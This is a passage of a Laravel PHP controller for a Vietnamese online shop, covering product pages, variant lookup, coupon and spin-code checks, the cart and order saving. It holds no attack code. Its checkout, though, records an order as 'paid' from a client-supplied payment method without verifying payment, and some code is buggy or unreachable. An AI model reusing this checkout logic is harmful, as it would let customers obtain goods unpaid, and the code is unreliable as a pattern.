                $list_size = $productSku->pluck('size_id')->unique()->toArray();
                $total =  $productSku->sum('quantity');
                $subTotal =  $productSku->sum('sub_quantity');
                $sumValue = $total - $subTotal;
                $colors = Color::wherein('id', $list_color)->get();
                $sizes = Size::wherein('id', $list_size)->get();
                $image_color = $productSku->pluck('photo', 'color_id')->toArray();
                $productSku = $productSku->where('is_default', 1)->first();
                if(!$productSku){
                    $productSku = $product->productSku()->first();
                }
                $getSale = Coupon::getSaleProduct(@$productSku->id);
                $salePrice = $getSale->get('getPrice');
                $photo = $productSku->photo ? explode(',', $product->photo) : $productSku->photo;

                $relatedProducts = Product::whereHas('cates', function ($query) use ($category) {
                    $query->wherein('category_id', $category->pluck('id')->toArray());
                })->where('id', '<>', $product->id)->where('type_init', null)->where('status', 1)->inRandomOrder()->limit(10)->get();
                return view(
                    "layout-home.pages.product-detail",
                    compact('product', 'relatedProducts', 'salePrice', 'photo', 'colors', 'sumValue', 'sizes', 'image_color', 'productSku')
                );
            } else {
                $relatedProducts = Product::whereHas('cates', function ($query) use ($category) {
                    $query->wherein('category_id', $category->pluck('id')->toArray());
                })->where('id', '<>', $product->id)->where('type_init', 'combo')->where('status', 1)->inRandomOrder()->limit(10)->get();
                return view(
                    "layout-home.pages.product-detail-combo",
                    compact('product', 'relatedProducts')
                );
            }
        }
    }
    function pageDetail(Request $rq, $slug)
    {
        $page = Post::where('slug', $slug)->first();
        if(!$page){
            return view('errors.404-home');
        }
        return view('layout-home.pages.page')->with('page', $page)->render();
    }
    function ajaxLoadPage(Request $rq)
    {
        $slug = $rq->slug;
        $page = Post::where('slug', $slug)->first();
        return view('layout-home.pages.ajax-page.page-ajax')->with('page', $page)->render();
    }
    function querySkuDetail(Request $rq)
    {
        if ($rq->ajax()) {
            $product = Product::find($rq->id);
            $productSku = $product->productSku;
            $list_color = $productSku->pluck('color_id')->unique()->toArray();
            $list_size = $productSku->pluck('size_id')->unique()->toArray();
            $total =  $productSku->sum('quantity');
            $subTotal =  $productSku->sum('sub_quantity');
            $sumValue = $total - $subTotal;
            $colors = Color::wherein('id', $list_color)->get();
            $sizes = Size::wherein('id', $list_size)->get();
            $image_color = $productSku->pluck('photo', 'color_id')->toArray();
            $listSize = $productSku->where('color_id', $rq->color_id)->pluck('size_id')->unique()->toArray();
            $listColor = [];
            if ($rq->visible == 1) {
                $listSize = $productSku->where('color_id', $rq->color_id)->pluck('size_id')->unique()->toArray();
            }
            if ($rq->visible == 2) {
                $listColor = $productSku->where('size_id', $rq->size_id)->pluck('color_id')->unique()->toArray();
            }
            $temp = $productSku->where('color_id', $rq->color_id)->where('size_id', $rq->size_id)->first();
            $notActive = '';
            if (!$temp) {
                if ($rq->color_id) {
                    $temp = $productSku->where('color_id', $rq->color_id)->first();
                    $notActive = 'size';
                } else {
                    $temp = $productSku->where('size_id', $rq->size_id)->first();
                    $notActive = 'color';
                }
            }
            $productSku = $temp;
            $getSale = Coupon::getSaleProduct($productSku->id);
            $salePrice = $getSale->get('getPrice');
            $photo = [];
            if ($notActive != 'color') {
                $photo[] = $productSku->photo;
            }
            if ($product->photo) {
                $photo = [...$photo, ...explode(',', $product->photo)];
            }

            return view('layout-home.pages.ajax-page.detail-page-item')
                ->with('salePrice', $salePrice)
                ->with('colors', $colors)
                ->with('notActive', $notActive)
                ->with('sumValue', $sumValue)
                ->with('sizes', $sizes)
                ->with('listSize', $listSize)
                ->with('listColor', $listColor)
                ->with('image_color', $image_color)
                ->with('productSku', $productSku)
                ->with('photo', $photo)
                ->with('product', $product)->render();
        }
    }
    function searchQuery(Request $rq)
    {
        $product = [];
        if ($rq->search) {
            $product = Product::where('title', 'like', $rq->search . '%')->orwhere('sku', 'like', $rq->search . '%')->limit(8)->get();
        }
        return view('layout-home.pages.ajax-page.search-list-item')->with('product', $product)->render();
    }

    public function discountStatus($discount, $total)
    {
        $daynow = Carbon::now();
        $flag = false;
        switch ($discount) {
            case ($discount->date_start != null && $discount->date_start > $daynow):
                return [$flag, __('Code not activated')];
            case ($discount->date_end != null && $discount->date_end < $daynow->subDay(1)):
                return [$flag, __('Code has expired')];
            case ($discount->amount_code == 0):
                return [$flag, __('Code has 0 uses left')];
            case ($discount->total_order_min != null && $discount->total_order_min > $total):
                return [$flag, __('Code only applies to orders over: ') . number_format($discount->total_order_min, 0, 0, '.') . ' VNĐ'];
            case ($discount->price_order_max != null && $discount->price_order_max < $total):
                return [$flag, __('Code only applies to orders under: ') . number_format($discount->price_order_max, 0, 0, '.') . ' VNĐ'];
            default:
                $flag = true;
                return [$flag, __('Use code successfully')];
        }
    }
    public function discountStatusSpins($discount)
    {
        $daynow = Carbon::now();
        $spin = Spin::find(1);
        $maxDate = @$spin->expired_num;
        $day = Carbon::createFromFormat('Y-m-d H:i:s', $discount->created_at);
        $dif = $daynow->diffInHours($day);
        $flag = false;
        if($dif > $maxDate * 24){
            return [$flag, __('Code not activated')];
        }
        else{
            $flag = true;
            return [$flag, __('Use code successfully')];
        }
    }
    function cartIndex(Request $rq)
    {
        $carts = session()->get('cartShop');
        if ($carts && count($carts) > 0) {
            return redirect()->route('checkout');
        }
        return view('layout-home.pages.cart-index', compact('carts'));
    }

    function checkout(Request $rq)
    {
        $shipAddress = null;
        if(Auth::user()){
            $tem = Address::where('user_id', Auth::user()->id)->where('is_default', 1)->first();
            if(!$tem){
                $tem = Address::where('user_id', Auth::user()->id)->first();
            }
            $shipAddress = $tem;
        }
        $carts = session()->get('cartShop');
        if (!$carts || count($carts) == 0) {
            return view('layout-home.pages.cart-index', compact('carts'));
        }
        $code = session()->get('coupon');
        $baseTotal = $this->getSumPrice();
        $discount = null;
        $countPonSpin = null;
        $message = null;
        $province = $rq->province;
        if ($rq->not_discount_code) {
            session()->pull('coupon', 'default');
        }
        if (!$rq->not_discount_code && ($code || $rq->discount_code)) {
            $isCoupon = true;
            $discount = Coupon::whereNotNull('code')->where('code', $rq->discount_code ? $rq->discount_code : $code)->where('status', 1)->first();
            $countPonSpin = AccountSpin::whereNotNull('code')->where('code', $rq->discount_code ? $rq->discount_code : $code)->first();
            if(!$discount && $countPonSpin){
                $isCoupon = false;
            }
            if (!$discount && !$countPonSpin) {
                $message = [false, __('Code does not exist')];
            } else {
                if($isCoupon)
                {
                    $getFlag = $this->discountStatus($discount, $baseTotal);
                    $message = $getFlag;
                    if ($rq->discount_code) {
                        session(['coupon' => $discount->code]);
                    }
                }
                else{
                    $getFlag = $this->discountStatusSpins($countPonSpin);
                    $message = $getFlag;
                    session(['coupon' => $countPonSpin->code]);
                }
            }
        }
        if ($rq->ajax()) {
            if ($rq->id && $rq->quantity) {
                $getCart = session()->get('cartShop');
                foreach ($getCart as $key => $item) {
                    if (isset($item->combo)) {
                        if ($item->id == $rq->id && $item->item_id === $rq->item_id) {
                            $getCart[$key]->quantity = (int)$rq->quantity;
                            array_values($getCart);
                        }
                    } else {
                        if ($item->id == $rq->id) {
                            $getCart[$key]->quantity = (int)$rq->quantity;
                            array_values($getCart);
                        }
                    }
                }
                session()->put('cartShop', $getCart);
                session()->save();
            }
            if ($rq->id_cl) {
                $getId = session()->get('cartShop');
                for ($i = 0; $i < count($getId); $i++) {
                    if (isset($item->combo)) {
                        if ($getId[$i]->id == $rq->id_cl && $item->item_id === $rq->item_id) {
                            unset($getId[$i]);
                            $newGetId = array_values($getId);
                            session()->put('cartShop', $newGetId);
                            session()->save();
                            break;
                        }
                    } else {
                        if ($getId[$i]->id == $rq->id_cl) {
                            unset($getId[$i]);
                            $newGetId = array_values($getId);
                            session()->put('cartShop', $newGetId);
                            session()->save();
                            break;
                        }
                    }
                }
            }
            $carts = session()->get('cartShop');
            $baseTotal = $this->getSumPrice();
            $lists = view('layout-home.pages.ajax-page.checkout.list')->with('carts', $carts)->render();
            $checkout = view('layout-home.pages.ajax-page.checkout.total')->with('baseTotal', $baseTotal)
                ->with('discount', $discount)->with('countPonSpin', $countPonSpin)->with('message', $message)->with('province', $province)->render();
            return response()->json([
                'message' => true,
                'message_coupon' => $message,
                'lists' => $lists,
                'checkout' => $checkout,
                'url' => route('cart.index'),
                'flag' => count($carts) == 0,
            ]);
        }
        return view('layout-home.pages.checkout', compact('carts', 'baseTotal', 'discount', 'countPonSpin', 'message', 'province', 'shipAddress'));
    }
    public function getDiscountTotal($discount)
    {
        $total = $this->getSumPrice();
        if (!$discount) {
            $message = [false, __('Code does not exist')];
        } else {
            $message = $this->discountStatus($discount, $total);
        }
        if ($discount->type == 'percent price') {
            $discountTotal = ($discount->price_value * $total) / 100;
            $discountText = $discount->price_value . ' %';
        } else {
            $discountTotal = $discount->price_value;
            $discountText = number_format($discount->price_value, 0, 0, '.') . ' VNĐ';
        }
        $total = $total - $discountTotal;
        return collect([
            'total' => $total,
            'discountText' => $discountText,
            'message' => $message
        ]);
    }
    public function getDiscountTotalSpin($discount)
    {
        $total = $this->getSumPrice();
        if (!$discount) {
            $message = [false, __('Code does not exist')];
        } else {
            $message = $this->discountStatusSpins($discount);
        }
        $itemSpin = $discount->spinItem;
        if ($itemSpin->type == 1) {
            $discountTotal = ($itemSpin->amount * $total) / 100;
            $discountText = $itemSpin->amount . ' %';
        } else {
            $discountTotal = $itemSpin->amount;
            $discountText = number_format($itemSpin->amount, 0, 0, '.') . ' VNĐ';
        }
        $total = $total - $discountTotal;
        return collect([
            'total' => $total,
            'discountText' => $discountText,
            'message' => $message
        ]);
    }
    function checkoutSuccess(){
        if(session('msg_order')){
            $order = session('msg_order');
            $shipAddress = null;
            if(Auth::user()){
                $tem = Address::where('user_id', @$order->customer_id)->where('is_default', 1)->first();
                if(!$tem){
                    $tem = Address::where('user_id', @$order->customer_id)->first();
                }
            $shipAddress = $tem;
            }
            return view('layout-home.pages.onssuccess-checkout', compact('order', 'shipAddress'));
        }
        return redirect()->route('cart.index');
    }
    function checkoutSave(Request $rq)
    {
        $message = null;
        $discount = null;
        $countPonSpin = null;
        $getCart = session()->get('cartShop');
        $discount_code = session()->get('coupon');
        $subTotal = $this->getSumPrice();
        $total = $subTotal;
        $config = Setting::all()->first();
        $fee = $config->fee;
        if (!$rq->region_id || ($rq->region_id != 'Thành phố Hà Nội' && $rq->region_id != 'Thành phố Hồ Chí Minh')) {
            $fee = $config->fee2;
        }
        if ($config->freeship <= $total) {
            $fee = 0;
        }
        if (isset($discount_code)) {
            $isCoupon = true;
            $discount = Coupon::whereNotNull('code')->where('code', $discount_code)->where('status', 1)->first();
            $countPonSpin = AccountSpin::whereNotNull('code')->where('code', $discount_code)->first();
            if(!$discount && $countPonSpin){
                $isCoupon = false;
            }
            if ($discount && $isCoupon) {
                $message = $this->getDiscountTotal($discount)->get('message');
                if ($message[0] == true) {
                    $total = $this->getDiscountTotal($discount)->get('total');
                }
            }
            else if($countPonSpin && !$isCoupon){
                $message = $this->getDiscountTotalSpin($countPonSpin)->get('message');
                if ($message[0] == true) {
                    $total = $this->getDiscountTotalSpin($countPonSpin)->get('total');
                }
            }
        }
        $total = $total + $fee;
        // $user = User::find(Auth::user()->id);
        $order_code = "EDIFA-" . Carbon::now()->timestamp . (Auth::user() ? Auth::user()->id : 0);
        $order = new Order();
        $order->order_code = $order_code;
        $order->user_id = Auth::user() ? Auth::user()->id : 0;
        $order->customer_id = Auth::user() ? Auth::user()->id : 0;
        $order->order_date = Carbon::now();
        $order->sub_total = $subTotal;
        $order->total = $total;
        $order->payment_id = $rq->payment_id ?: NULL;
        $order->payment_method = $rq->pay_method;
        $order->name = $rq->firstname;
        $order->region = $rq->region_id;
        $order->city = $rq->city;
        $order->wards = $rq->postcode;
        $order->phone = $rq->telephone;
        $order->address = $rq->street;
        $order->messages = $rq->comment;
        $order->fee = $fee;
        if($countPonSpin){
            $order->coupon_code = $countPonSpin && (isset($message[0]) && $message[0] == true) ? $countPonSpin->code : '';
            $order->coupon_amount = $countPonSpin && (isset($message[0]) && $message[0] == true) ? number_format($countPonSpin->spinItem->amount,0,0, '.') . ($countPonSpin->spinItem->type == 1 ? '%' : '') : 'đ';
        }
        else{
            $order->coupon_code = $discount && (isset($message[0]) && $message[0] == true) ? $discount->code : '';
            $order->coupon_amount = $discount && (isset($message[0]) && $message[0] == true) ?  number_format($discount->price_value, 0, 0, '.') . ($discount->type == 'percent price' ? '%' : 'đ') : '';
        }
        $order->payment_status = $rq->pay_method == 'cod' ? 'unpaid' : 'paid';
        $order->save();
        foreach ($getCart as $rf) {
            if (isset($rf->combo)) {
                $product = Product::find($rf->id);
                $combo = ComboItem::where('combo_id', $rf->id)->get();
                if ($combo) {
                    $amount = 0;
                    foreach ($combo as $item) {
                        $n_quantity = $rf->quantity *  $item->quantity * $item->amount;
                        $amount += $item->quantity;
                    }
                    $price_sku = $product->price / $amount;
                    foreach ($rf->item_id as $sku_id) {
                        $sku = Sku::find($sku_id);
                        $OrderItem = new OrderItem();
                        $OrderItem->order_id = $order->id;
                        $OrderItem->sku_id = $sku->id;
                        $OrderItem->sub_price = $price_sku;
                        $OrderItem->price = $sku->price;
                        $OrderItem->quantity = $n_quantity;
                        $OrderItem->save();
                        $sku->sub_quantity = $sku->sub_quantity -  $rf->quantity;
                        $sku->save();
                    };
                }
            } else {
                $sku = Sku::find($rf->id);
                $getSale = Coupon::getSaleProduct($sku->id);
                $getSell = $getSale->get('getPrice');
                $OrderItem = new OrderItem();
                $OrderItem->order_id = $order->id;
                $OrderItem->sku_id = $sku->id;
                $OrderItem->sub_price = $getSell;
                $OrderItem->price = $sku->price;
                $OrderItem->quantity = $rf->quantity;
                $OrderItem->save();
                $sku->sub_quantity = $sku->sub_quantity -  $rf->quantity;
                $sku->save();
            }
        }
        if ($message && $message[0] && $discount) {
            if ($discount->amount_code != null && $discount->amount_code > 0) {
                $discount->amount_code -= 1;
                $discount->save();
            }
        }
        session()->pull('coupon');
        session()->pull('cartShop');
        session()->save();
        session()->flash('msg_cart', __('Order successful thank you'));
        session()->flash('msg_order', $order);
        return response()->json(['url' => route('checkout.success')]);
        // if ($rq->payment_id) {
        //     return response()->json();
        // }
        return view('layout-home.pages.cart-index')->with('msg_cart', __('Order successful thank you'));
    }
}
